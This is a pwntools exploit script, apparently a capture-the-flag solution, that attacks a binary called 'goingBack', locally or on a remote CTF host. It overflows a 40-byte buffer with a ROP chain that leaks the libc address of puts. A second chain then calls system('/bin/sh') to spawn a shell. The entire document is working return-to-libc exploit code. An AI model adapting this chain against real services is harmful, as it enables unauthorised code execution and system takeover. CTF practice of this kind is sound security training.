from pwn import *

exe = ELF('./goingBack_patched')
libc = ELF('./libc6_2.35-0ubuntu1_amd64.so')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *gets+141
        b *0x401342
        continue
    """)
elif args.REMOTE:
    io = remote("dyn.ctf.pearlctf.in", 30011)

# ********************************************
# leak libc
# ********************************************
rop = ROP(exe)
offset = 40

review_address = 0x40126a
rop.raw(b'A' * offset)
rop.puts(exe.got.puts)
rop.raw(pack(review_address))

io.sendlineafter(b':', b'first_name')
io.sendlineafter(b':', b'last_name')
io.sendlineafter(b':', b'123')
io.sendlineafter(b':', b'Bangalore')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b'experience', rop.chain())

io.recvline()
io.recvline()
io.recvline()

puts_address = int.from_bytes(io.recvline().strip(), 'little')
libc.address = puts_address - libc.sym.puts
print(hex(libc.sym.system))

# ********************************************
# system('/bin/sh')
# ********************************************
rop = ROP(exe)
offset = 40

print(hex(next(libc.search(b'/bin/sh'))))

rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['ret']))
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])

io.sendlineafter(b':', b'1')
io.sendlineafter(b'experience', rop.chain())

io.interactive()
